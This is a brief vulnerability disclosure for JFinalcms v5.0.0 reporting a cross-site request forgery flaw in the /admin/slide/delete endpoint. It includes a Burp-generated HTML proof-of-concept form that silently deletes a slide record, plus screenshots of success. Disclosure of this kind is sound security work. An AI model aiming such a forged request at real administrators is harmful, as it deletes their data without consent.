target:https://gitee.com/heyewei/JFinalcms

version:v5.0.0

JFinalcms v5.0.0 was discovered to contain a Cross-Site Request Forgery (CSRF) via the component /admin/slide/delete

![image](https://github.com/li-yu320/cms/assets/54130055/7d1a084b-02fa-4a3a-8bbc-65aa8de433f0)

create poc

![image](https://github.com/li-yu320/cms/assets/54130055/a67e8ad4-738f-4194-b9d4-76f75c468700)

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
  <script>history.pushState('', '', '/')</script>
    <form action="http://127.0.0.1:8888/admin/slide/delete" method="POST">
      <input type="hidden" name="ids" value="84" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

```

successed

![image](https://github.com/li-yu320/cms/assets/54130055/201f928e-57a3-4e42-a52b-82ac9ec369bf)
